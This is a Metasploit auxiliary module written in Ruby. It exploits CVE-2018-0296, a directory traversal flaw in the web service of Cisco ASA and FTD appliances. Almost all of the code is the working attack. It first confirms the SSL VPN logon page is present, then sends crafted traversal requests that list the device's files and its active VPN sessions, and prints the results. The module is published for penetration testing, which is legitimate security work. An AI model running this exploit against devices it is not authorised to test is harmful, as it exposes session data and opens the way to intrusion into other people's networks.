##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Cisco ASA Directory Traversal',
      'Description'    => %q{
        This module exploits a directory traversal vulnerability in Cisco's Adaptive Security Appliance (ASA) software and Firepower Threat Defense (FTD) software.
      },
      'Author'         => [ 'Michał Bentkowski',  # Discovery
                            'Yassine Aboukir',    # PoC
                            'Shelby Pace'         # Metasploit Module
                          ],
      'License'        => MSF_LICENSE,
      'References'     => [
                           [ 'CVE', '2018-0296' ],
                           [ 'EDB', '44956' ]
                          ],
      'DisclosureDate' => 'Jun 6 2018'
    ))

    register_options(
      [
        OptString.new('TARGETURI', [ true, 'Path to Cisco installation', '/' ]),
        OptBool.new('SSL', [ true, 'Use SSL', true ]),
        Opt::RPORT(8080)
      ])
  end

  def is_accessible?
    uri = normalize_uri(target_uri.path, '+CSCOE+/logon.html')

    res = send_request_cgi(
      'method'  =>  'GET',
      'uri'     =>  uri
    )

    return (res && res.body.include?("SSL VPN Service"))
  end

  def get_files
    file_uri = normalize_uri(target_uri.path, '/+CSCOU+/../+CSCOE+/files/file_list.json?path=/')
    sessions_uri = normalize_uri(target_uri.path, '/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions/')
    cscoe_uri = normalize_uri(target_uri.path, '/+CSCOU+/../+CSCOE+/files/file_list.json?path=%2bCSCOE%2b')

    file_res = send_request_cgi(
      'method'  =>  'GET',
      'uri'     =>  file_uri
    )

    sessions_res = send_request_cgi(
      'method'  =>  'GET',
      'uri'     =>  sessions_uri
    )

    cscoe_res = send_request_cgi(
      'method'  =>  'GET',
      'uri'     =>  cscoe_uri
    )

    if file_res && sessions_res && cscoe_res
      print_good(file_res.body)
      print_good(sessions_res.body)
      print_good(cscoe_res.body)
    end
  end

  def run
    unless is_accessible?
      fail_with(Failure::NotFound, 'Failed to reach Cisco web logon service')
    end

    get_files
  end

end

